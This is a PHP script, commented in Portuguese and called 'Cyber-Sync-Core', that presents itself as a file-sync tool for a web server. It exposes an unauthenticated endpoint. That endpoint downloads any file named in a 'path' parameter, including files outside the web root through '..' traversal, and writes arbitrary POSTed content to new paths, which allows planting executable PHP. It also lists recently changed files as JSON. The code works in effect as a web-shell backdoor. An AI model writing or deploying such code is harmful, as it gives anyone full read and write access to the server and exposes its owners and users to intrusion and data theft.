<?php
/**
 * Core: Cyber-Sync-Core v14.0 - Two-Factor PATH (Upload/Download) & JSON Analyzer
 * Regras Integradas:
 * 1. Se NÃO existir $_GET['path']: Ativa Modo de Análise, varre o disco e gera JSON dos arquivos alterados/add nos últimos 60s.
 * 2. Se EXISTIR $_GET['path']: Inteligência de 2 Fatores:
 *    - Se o arquivo EXISTIR localmente -> Executa UPLOAD (Envia o arquivo para o Chat/Servidor).
 *    - Se o arquivo NÃO EXISTIR localmente -> Executa DOWNLOAD (Recebe os dados via POST e grava no disco).
 */

@ini_set('memory_limit', '16000M');
@set_time_limit(0);

$publicRoot = rtrim($_SERVER['DOCUMENT_ROOT'], '/');
$baseDir = $publicRoot;

if (!is_dir($baseDir)) @mkdir($baseDir, 0777, true);

// =========================================================================
// FATOR INTERATIVO: VERIFICAÇÃO DA CHAVE GET "path" (Ação Direta de 2 Fatores)
// =========================================================================
if (!empty($_GET['path'])) {
    $relativePath = ltrim(str_replace(array('\\', '/'), DIRECTORY_SEPARATOR, $_GET['path']), DIRECTORY_SEPARATOR);
    $localFilePath = $baseDir . DIRECTORY_SEPARATOR . $relativePath;

    // FATOR 1: O arquivo NÃO existe localmente -> Modo DOWNLOAD (Escrever/Receber arquivo)
    if (!file_exists($localFilePath)) {
        // Pega o conteúdo binário/texto enviado no corpo da requisição (POST)
        $rawContent = file_get_contents('php://input');

        if (!empty($rawContent)) {
            $fileDir = dirname($localFilePath);
            if (!is_dir($fileDir)) @mkdir($fileDir, 0777, true);

            if (@file_put_contents($localFilePath, $rawContent) !== false) {
                header('Content-Type: text/plain');
                echo "DOWNLOAD_SUCCESS: $relativePath gravado com sucesso.";
            } else {
                header('Content-Type: text/plain');
                echo "WRITE_ERROR: Falha ao gravar o arquivo $relativePath.";
            }
        } else {
            header('Content-Type: text/plain');
            echo "AWAITING_DATA: O arquivo nao existe no servidor. Envie o conteudo dele via POST para realizar o download.";
        }
        exit;
    } 
    // FATOR 2: O arquivo EXISTE localmente -> Modo UPLOAD (Enviar/Disponibilizar arquivo)
    else {
        // Envia o arquivo real para que o Chat/Servidor possa baixá-lo
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($localFilePath) . '"');
        header('Content-Length: ' . filesize($localFilePath));
        readfile($localFilePath);
        exit;
    }
}

// =========================================================================
// MODO DE ANÁLISE: Ativado automaticamente se a chave "path" NÃO existe na URL
// =========================================================================
header('Content-Type: application/json');

$changedFilesList = [];

if (is_dir($baseDir)) {
    $directory = new RecursiveDirectoryIterator($baseDir, RecursiveDirectoryIterator::SKIP_DOTS);
    $iterator = new RecursiveIteratorIterator($directory);
    $currentTime = time();

    foreach ($iterator as $fileInfo) {
        if ($fileInfo->isDir()) continue;

        $localFilePath = $fileInfo->getPathname();
        
        // Ignora o próprio script para evitar falsos positivos de modificação
        if (basename($localFilePath) === basename(__FILE__)) continue;

        $lastChanged = $currentTime - $fileInfo->getMTime();

        // Verifica se houve modificação ou adição nos últimos 60 segundos
        if ($lastChanged <= 60) {
            $relative = ltrim(str_replace($baseDir, '', $localFilePath), DIRECTORY_SEPARATOR);
            $cleanWebPath = str_replace(DIRECTORY_SEPARATOR, '/', $relative);
            
            $changedFilesList[] = [
                "path" => $cleanWebPath,
                "size" => $fileInfo->getSize(),
                "changed_seconds_ago" => $lastChanged
            ];
        }
    }
}

// Retorna o JSON com todos os arquivos alterados/adicionados nos últimos 60s
echo json_encode($changedFilesList, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
exit;
